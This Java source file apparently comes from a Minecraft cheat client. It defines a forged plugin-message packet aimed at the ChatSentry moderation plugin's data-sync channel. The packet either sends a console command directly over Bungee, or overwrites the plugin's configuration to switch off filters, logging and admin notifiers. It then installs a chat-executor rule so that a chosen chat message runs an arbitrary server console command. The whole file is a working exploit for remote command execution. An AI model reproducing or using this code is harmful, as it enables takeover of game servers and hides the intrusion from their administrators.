package me.nullnet.voxelclient.packets;

import com.google.common.io.ByteArrayDataOutput;
import com.google.common.io.ByteStreams;
import java.util.Objects;
import net.minecraft.class_2540;
import net.minecraft.class_2960;
import net.minecraft.class_8710;
import net.minecraft.class_9139;
import net.minecraft.class_8710.class_9154;

public record ChatSentryPayloadPacket(String command, boolean isBungee, String type, String executionMessage) implements class_8710 {
   public static final class_9139<class_2540, ChatSentryPayloadPacket> CODEC = class_8710.method_56484(ChatSentryPayloadPacket::write, ChatSentryPayloadPacket::new);
   public static final class_9154<ChatSentryPayloadPacket> ID = new class_9154(class_2960.method_60655("chatsentry", "datasync"));

   private ChatSentryPayloadPacket(class_2540 buf) {
      this(buf.method_19772(), buf.readBoolean(), buf.method_19772(), buf.method_19772());
   }

   public ChatSentryPayloadPacket(String command, boolean isBungee, String type, String executionMessage) {
      this.command = command;
      this.isBungee = isBungee;
      this.type = type;
      this.executionMessage = executionMessage;
   }

   private void write(class_2540 buf) {
      ByteArrayDataOutput out = ByteStreams.newDataOutput();
      if (this.isBungee) {
         out.writeUTF("console_command");
         out.writeUTF(this.command);
         buf.method_52983(out.toByteArray());
      } else {
         if (Objects.equals(this.type, "config")) {
            out.writeUTF("sync");
            out.writeUTF("");
            out.writeUTF("skibidi");
            out.writeUTF("config.yml");
            out.writeUTF("check-for-updates: false\nprocess-chat: true\nprocess-commands: true\nprocess-signs: true\nprocess-anvils: true\nprocess-books: true\ncontext-prediction: true\ndisable-vanilla-spam-kick: true\nnetwork:\nenable: false\nsync-configs: true\nglobal-admin-notifier-messages: true\nenable-admin-notifier: false\nenable-discord-notifier: false\nenable-auto-punisher: false\nenable-word-and-phrase-filter: false\nenable-link-and-ad-blocker: false\nenable-spam-blocker: false\nenable-chat-cooldown: false\nenable-anti-chat-flood: false\nenable-unicode-remover: false\nenable-cap-limiter: false\nenable-anti-parrot: false\nenable-chat-executor: true\nenable-anti-statue-spambot: false\nenable-anti-relog-spam: false\nenable-anti-join-flood: false\nenable-anti-command-prefix: false\nenable-auto-grammar: false\nenable-command-spy: false\nenable-logging-for:\nchat-cooldown: false\nlink-and-ad-blocker: true\nword-and-phrase-filter: true\nspam-blocker: true\nunicode-remover: true\ncap-limiter: true\nanti-parrot: true\nanti-chat-flood: true\nanti-statue-spambot: false\nchat-executor: false\nclean-logs-older-than: 30\noverride-bypass-permissions:\nchat-cooldown: false\nlink-and-ad-blocker: false\nword-and-phrase-filter: false\nspam-blocker: false\nunicode-remover: false\ncap-limiter: false\nanti-parrot: false\nanti-chat-flood: false\nanti-statue-spambot: false\nanti-join-flood: false\nchat-executor: true\nauto-grammar: false\nanti-command-prefix: false\ncommand-spy: false\nlockdown:\nactive: false\ncurrent-mode: \"only-known\"\nexempt-usernames:\n  - \"Notch\"\n  - \"jeb_\"\ncommand-blacklist:\n- \"/tell\"\n");
         } else {
            out.writeUTF("sync");
            out.writeUTF("modules");
            out.writeUTF("skibidi");
            out.writeUTF("chat-executor.yml");
            out.writeUTF("entries:\n  1:\n    match: \"{regex}(REPLACE-THE-MESSAGE)\"\n    set-matches-as: \"{block}\"\n    execute:\n      - \"{console_cmd}: REPLACE-THE-COMMAND\"\n      - \"{player_msg}: &a&lSUCCESS!\"\n".replaceAll("REPLACE-THE-COMMAND", this.command).replaceAll("REPLACE-THE-MESSAGE", this.executionMessage));
         }

         out.writeUTF("2822111278697");
         buf.method_52983(out.toByteArray());
      }

   }

   public class_9154<ChatSentryPayloadPacket> method_56479() {
      return ID;
   }

   public String command() {
      return this.command;
   }

   public boolean isBungee() {
      return this.isBungee;
   }

   public String type() {
      return this.type;
   }

   public String executionMessage() {
      return this.executionMessage;
   }
}
